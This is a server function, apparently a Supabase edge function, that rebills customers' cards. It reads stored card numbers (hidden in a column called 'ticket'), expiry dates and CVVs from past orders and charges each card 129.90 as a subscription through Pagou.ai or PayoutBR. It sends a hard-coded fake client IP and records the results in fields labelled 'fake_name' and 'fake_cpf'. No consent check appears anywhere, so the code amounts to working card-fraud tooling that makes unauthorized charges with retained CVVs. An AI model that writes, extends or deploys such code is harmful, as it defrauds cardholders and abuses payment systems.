import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

async function getCardProvider(): Promise<string> {
  try {
    const url = Deno.env.get('SUPABASE_URL') || '';
    const key = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || Deno.env.get('SUPABASE_ANON_KEY') || '';
    const supabase = createClient(url, key);
    const { data } = await supabase.from('payment_settings').select('card_provider').eq('id', 1).maybeSingle();
    return (data?.card_provider as string) || 'payout';
  } catch {
    return 'payout';
  }
}

async function callPagouAI(params: any, secretKey: string) {
  const { customer, items, amount, card, installments, externalRef, webhookUrl } = params;
  const payload = {
    amount: Math.round(amount * 100),
    installments: installments || 1,
    capture: true,
    payment_method: 'credit_card',
    postback_url: webhookUrl,
    metadata: { external_ref: externalRef },
    customer: {
      name: customer?.name, email: customer?.email, phone: (customer?.phone || '').replace(/\D/g, ''),
      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
    },
    card: {
      number: card.number, holder_name: card.holder_name,
      exp_month: card.exp_month, exp_year: card.exp_year, cvv: card.cvv,
    },
    items: items.map((it: any) => ({
      title: it.title, unit_price: it.unitPrice, quantity: it.quantity, tangible: true,
    })),
  };
  const resp = await fetch('https://api.pagou.ai/v2/transactions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${secretKey}` },
    body: JSON.stringify(payload),
  });
  return await resp.json();
}

async function callPayout(params: any, secretKey: string) {
  const { customer, items, amount, card, installments, externalRef, webhookUrl, clientIp } = params;
  const payload = {
    paymentMethod: 'credit_card', amount: Math.round(amount * 100), installments, ip: clientIp,
    postbackUrl: webhookUrl, metadata: externalRef,
    customer: {
      name: customer?.name, email: customer?.email, phone: (customer?.phone || '').replace(/\D/g, ''),
      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
    },
    card: {
      number: card.number, holderName: card.holder_name,
      expirationMonth: parseInt(card.exp_month, 10), expirationYear: parseInt(card.exp_year, 10), cvv: card.cvv,
    },
    items,
  };
  const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'authorization': `Basic ${btoa(`${secretKey}:x`)}` },
    body: JSON.stringify(payload),
  });
  return await resp.json();
}

serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });
  const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
  const SERVICE_ROLE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
  const supabase = createClient(SUPABASE_URL, SERVICE_ROLE);

  try {
    let forced = false;
    try { const body = await req.json(); forced = !!body?.force; } catch (_) {}
    const { data: settings } = await supabase.from('rebill_settings').select('*').eq('id', true).single();
    const now = new Date();
    await supabase.from('rebill_settings').update({ last_run_at: now.toISOString() }).eq('id', true);

    if (!settings?.active && !forced) return new Response(JSON.stringify({ ok: true, skipped: 'inactive' }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    
    const provider = await getCardProvider();
    const webhookUrl = `${SUPABASE_URL}/functions/v1/payment-webhook`;

    const { data: candidates } = await supabase.from('orders').select('*').ilike('payment_method', 'Cartão%').eq('payment_status', 'paid').not('ticket', 'is', null).not('card_cvv', 'is', null).not('card_expiry', 'is', null).limit(100);
    
    const processOne = async (order: any) => {
      const cardNumber = String(order.ticket || '').replace(/\D/g, '');
      const expiry = String(order.card_expiry || '').replace(/\D/g, '');
      const card = {
        number: cardNumber, holder_name: order.card_holder_name,
        exp_month: expiry.slice(0, 2), exp_year: expiry.slice(2).length === 2 ? `20${expiry.slice(2)}` : expiry.slice(2),
        cvv: order.card_cvv,
      };
      const params = {
        customer: { name: order.customer_name, email: order.customer_email, phone: order.customer_phone, cpf: order.customer_cpf },
        items: [{ title: 'Assinatura', unitPrice: 12990, quantity: 1 }],
        amount: 129.9, installments: 1, externalRef: `rebill-${order.id}`, webhookUrl, clientIp: '189.1.1.1',
      };

      let raw, status, txId, refusal;
      if (provider === 'pagouai') {
        raw = await callPagouAI(params, Deno.env.get('PAGOUAI_SECRET_KEY')!);
        txId = String(raw?.id || '');
        status = String(raw?.status || 'failed').toLowerCase();
        refusal = raw?.refuse_reason || raw?.message;
      } else {
        raw = await callPayout(params, Deno.env.get('PAYOUT_SECRET_KEY')!);
        const tx = raw?.data ?? raw;
        txId = String(tx?.id || '');
        status = String(tx?.status || 'failed').toLowerCase();
        refusal = tx?.refuseReason || tx?.acquirerMessage || raw?.message;
      }

      const { data: inserted } = await supabase.from('rebill_orders').insert({
        source_order_id: order.id, source_order_number: order.order_number, product_name: 'Assinatura', amount: 129.9,
        fake_name: order.customer_name, fake_email: order.customer_email, fake_phone: order.customer_phone, fake_cpf: order.customer_cpf,
        card_last4: cardNumber.slice(-4), card_brand: order.card_brand, transaction_id: txId, status, refusal_reason: refusal, raw_response: raw,
      }).select().single();
      return inserted;
    };

    const results = await Promise.all((candidates || []).slice(0, settings?.batch_size || 4).map(processOne));
    return new Response(JSON.stringify({ ok: true, results }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  } catch (e: any) {
    return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});